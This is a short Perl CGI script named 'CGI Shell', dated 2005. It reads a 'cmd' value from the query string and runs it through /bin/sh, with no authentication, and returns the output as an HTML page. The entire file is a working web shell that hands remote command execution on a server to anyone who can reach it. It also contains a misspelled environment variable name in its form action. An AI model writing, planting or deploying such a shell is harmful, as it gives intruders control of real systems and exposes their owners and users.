#!/usr/bin/perl

#
# CGI Shell
# (C) Copyright Claes M Nyberg <cmn@darklab.org> 2005
#
# $Id: cgi_get_shell.pl,v 1.1 2005-03-09 23:19:57 cmn Exp $
#

# get arguments into an associative array
sub get_args()
{
	@pairs = split(/\&/ , $ENV{'QUERY_STRING'});
	foreach $pair (@pairs) {
		if ($pair=~m/([^=]+)=(.*)/) {
			$field = $1;
			$value = $2;
			$value =~ s/\+/ /g;
			$value =~ s/%([\dA-Fa-f]{2})/pack("C", hex($1))/eg;
			$args{$field}=$value;
		}
	}
    return(%args);
}

# Reopen standard error as standard out
open(STDERR, ">&STDOUT");

%args = get_args();
$cmd = $args{'cmd'};

print<<__ENDHTML__;
Content-type: text/html\n\n
	<head><title>CGI Shell</title></head>
	<html>
	<body>
__ENDHTML__
print "<form method=\"GET\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
		<input name="cmd" type="text" size="30">
		<input type="submit" value="Run">
	</form>
__ENDHTML__

# Run command
if ($cmd ne "") {
	$cmd = "/bin/sh -c " . "\"$cmd\"";
	print "Command: <b>$cmd</b><hr>";
	print "<pre>";
	open(CMD, "$cmd |");
	while (<CMD>) {
		print "$_";
	}
	print "</pre>";
}

print "</body></html>";
